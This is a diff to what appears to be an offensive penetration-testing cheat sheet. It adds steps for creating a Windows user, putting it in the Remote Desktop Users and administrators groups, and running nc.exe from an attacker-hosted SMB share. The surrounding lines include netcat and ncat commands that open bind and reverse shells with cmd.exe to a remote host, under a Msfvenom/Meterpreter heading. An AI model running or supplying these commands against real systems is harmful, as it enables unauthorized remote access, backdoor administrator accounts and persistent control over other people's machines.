@@ -1,3 +1,15 @@
+## RDP
+
+```
+If RDP group exits try to add self to group for rdp
+    -Add a user on Windows
+        -Command: net user $username $password /add
+    -Add a user to RDP Group
+        -Command: net localgroup "Remote Desktop Users" $username /add
+    -Make a user an administrator
+        -net localgroup administrators $username /add
+```
+
 ## Msfvenom
 
 * Meterpreter
@@ -46,5 +58,8 @@ nc.exe -nlvp 4444 -e cmd.exe
 nc.exe 192.168.1.101 443 -e cmd.exe
 
 ncat --exec cmd.exe --allow 192.168.1.101 -vnl 5555 --ssl
-ncat -nv <ip_to_connect> 4444
+ncat -nv <ip_to_connect> 4444	
+
+If netcat exe cant be located try to host own nc.exe
+Command: \\10.10.X.X\\share\nc.exe ****
 ```
